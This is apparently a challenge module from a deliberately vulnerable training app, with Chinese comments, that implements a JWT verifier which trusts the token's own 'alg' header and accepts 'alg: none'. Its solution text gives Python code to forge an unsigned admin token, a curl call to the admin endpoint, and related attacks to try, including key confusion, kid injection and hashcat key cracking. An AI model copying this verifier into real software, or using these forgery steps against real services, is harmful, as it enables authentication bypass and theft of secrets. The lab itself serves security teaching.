"""开放 API 平台的 JWT 鉴权绕过。

业务场景是"开放 API 平台"：调用方登录拿一个 JWT，之后带着它访问接口。
校验逻辑从 token 自己的头部里读 `alg` 字段，然后按那个算法去验 ——
包括 `alg: none`（也就是"不用验签"）。

JWT 是用标准库手搓的，没有引入 pyjwt。这样你能看清一个 token 到底是什么：
就是三段 base64，中间用点连起来。
"""

import base64
import hashlib
import hmac
import json
import time

from vuln4all import Vuln, render_template, request

SECRET = "api-signing-key-do-not-share"
TOKEN_TTL = 3600

USERS = {
    "analyst": ("analyst123", "viewer"),
    "ops": ("ops123", "operator"),
}

ADMIN_KEYS = {
    "支付网关": "pk_live_51Kx9mN2eZvKYlo2C",
    "对象存储": "AKIAIOSFODNN7EXAMPLE",
    "短信服务": "sms_live_7f3a9c1b4e8d",
}

#: 通关目标名。mark() 和 check() 共用同一个常量，免得拼错字。
GOAL = "用一张 alg=none、根本没签名的 token 通过了管理员接口的鉴权"


class JwtAlgNone(Vuln):
    info = {
        "name": "JWT 的 alg:none 绕过",
        "author": ["guaidao2"],
        "cwe": "CWE-347",
        "owasp": "A02:2021 - Cryptographic Failures",
        "difficulty": "困难",
        "description": (
            "API 的鉴权逻辑从 token 的头部里读 `alg`，然后按它去验签。"
            "问题是 `alg` 也是**攻击者写的** —— 把签名算法声明成 `none`，"
            "服务端就一份签名都不验了。"
        ),
        "hint": (
            "先用 analyst / analyst123 登录，拿到一个 token。"
            "token 是三段 base64 用点连起来的 —— 逐段解开看看里面都有什么。"
            "头部里有个 `alg` 字段，它决定了服务端怎么验签。\n"
            "关键问题：这个字段是**谁**写的？如果服务端信它，你能怎么利用？"
        ),
        "solution": (
            "一、先看清 token。把它按 . 拆成三段，每段做 base64url 解码：\n"
            "   头部 → {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n"
            "   载荷 → {\"user\":\"analyst\",\"role\":\"viewer\",\"exp\":...}\n"
            "   签名 → 一段二进制\n"
            "   注意：签名算法不是服务端定死的，是**token 自己声明的**。\n\n"
            "二、把 alg 改成 none，签名留空，自己拼一个 token：\n\n"
            "   import base64, json\n"
            "   def b64e(raw):\n"
            "       return base64.urlsafe_b64encode(raw).rstrip(b\"=\").decode()\n"
            "   header  = b64e(json.dumps({\"alg\": \"none\", \"typ\": \"JWT\"}).encode())\n"
            "   payload = b64e(json.dumps({\"user\": \"mallory\", \"role\": \"admin\"}).encode())\n"
            "   print(header + \".\" + payload + \".\")\n\n"
            "三、拿它去访问管理员接口：\n\n"
            "   curl '<主入口>/api/admin/keys' \\\n"
            "     -H 'Authorization: Bearer <上面打印的那串>'\n\n"
            "   页面出现 API 密钥列表 = 这题通了。\n\n"
            "顺带记住另外几种同类问题（换个目标时都要试）：\n"
            "  · alg 从 HS256 改成 RS256，然后用**公钥**当 HMAC 密钥去签名\n"
            "    （公钥是公开的，任何人都能拿来签）\n"
            "  · kid 参数注入：kid 指向文件系统路径或 SQL 查询\n"
            "  · 弱密钥爆破：hashcat -m 16500 <token> wordlist.txt\n"
            "  · 不校验 exp：旧 token 永远有效"
        ),
        "refs": [
            "https://portswigger.net/web-security/jwt",
            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
        ],
    }

    # ------------------------------------------------------------ JWT 基础

    @staticmethod
    def _b64e(raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    @staticmethod
    def _b64d(text: str) -> bytes:
        return base64.urlsafe_b64decode(text + "=" * (-len(text) % 4))

    def issue(self, user: str, role: str) -> str:
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"user": user, "role": role, "exp": int(time.time()) + TOKEN_TTL}
        head = self._b64e(json.dumps(header, separators=(",", ":")).encode())
        body = self._b64e(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = "%s.%s" % (head, body)
        sig = hmac.new(SECRET.encode(), signing_input.encode(), hashlib.sha256).digest()
        return signing_input + "." + self._b64e(sig)

    def verify(self, token: str) -> tuple:
        """验签并返回 (头部, 载荷)。抛 ValueError 表示不通过。"""
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("token 应该是三段，用 . 分开")

        try:
            header = json.loads(self._b64d(parts[0]))
            payload = json.loads(self._b64d(parts[1]))
        except Exception as exc:  # noqa: BLE001
            raise ValueError("头部或载荷解不开：%s" % exc)

        if not isinstance(header, dict) or not isinstance(payload, dict):
            raise ValueError("头部和载荷都应该是 JSON 对象")

        # 过期检查对所有算法都生效 —— 包括下面那条 none 分支。
        # 不然 `alg:none` 会顺带多送一个"token 永不过期"的副作用，
        # 那就超出这题要教的东西了。
        exp = payload.get("exp")
        if isinstance(exp, (int, float)) and time.time() > exp:
            raise ValueError("token 过期了")

        alg = str(header.get("alg", "")).strip().lower()

        # ↓↓↓ 洞就在这里：把 token 自己声明的 alg 当成事实 ↓↓↓
        if alg == "none":
            return header, payload
        # ↑↑↑ 正确做法：算法必须由服务端**写死**（只接受 HS256 或只接受 RS256），
        #     绝不能从 token 里读。上面这几行应该直接变成：
        #     if alg != "hs256": raise ValueError("只接受 HS256") ↑↑↑

        if alg != "hs256":
            raise ValueError("不支持的签名算法：%r" % header.get("alg"))

        signing_input = "%s.%s" % (parts[0], parts[1])
        expected = self._b64e(
            hmac.new(SECRET.encode(), signing_input.encode(), hashlib.sha256).digest()
        )
        if not hmac.compare_digest(expected, parts[2]):
            raise ValueError("签名不对")

        return header, payload

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)

        def token_from_request():
            auth = request.headers.get("Authorization", "")
            if auth.lower().startswith("bearer "):
                return auth[7:].strip()
            return request.args.get("token", "").strip()

        @app.route("/", methods=["GET", "POST"])
        def index():
            token = None
            error = None
            claims = None

            if request.method == "POST":
                user = request.form.get("user", "")
                password = request.form.get("password", "")
                record = USERS.get(user)
                if record and record[0] == password:
                    token = self.issue(user, record[1])
                    claims = {"user": user, "role": record[1]}
                else:
                    error = "用户名或密码不对"

            return render_template(
                "index.html", token=token, error=error, claims=claims,
                base=request.url_root.rstrip("/"),
            )

        @app.route("/api/me")
        def api_me():
            token = token_from_request()
            if not token:
                return render_template("token_error.html", message="没带 token"), 401
            try:
                _header, payload = self.verify(token)
            except ValueError as exc:
                return render_template("token_error.html", message=str(exc)), 401
            return render_template("me.html", payload=payload)

        @app.route("/api/admin/keys")
        def api_admin_keys():
            token = token_from_request()
            if not token:
                return render_template("token_error.html", message="没带 token"), 401
            try:
                header, payload = self.verify(token)
            except ValueError as exc:
                return render_template("token_error.html", message=str(exc)), 401

            if str(header.get("alg", "")).strip().lower() == "none":
                # 服务端接受了"不用验签"这个声明 —— 这张 token 是谁造的已经不重要了
                ctx.progress.mark(GOAL)

            if payload.get("role") != "admin":
                return (
                    render_template(
                        "token_error.html",
                        message="这个接口要 role=admin，你现在的 role 是 %r"
                        % payload.get("role"),
                        payload=payload,
                    ),
                    403,
                )
            return render_template("keys.html", keys=ADMIN_KEYS, payload=payload)

        return {"": app}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        return {GOAL: ctx.progress.achieved(GOAL)}
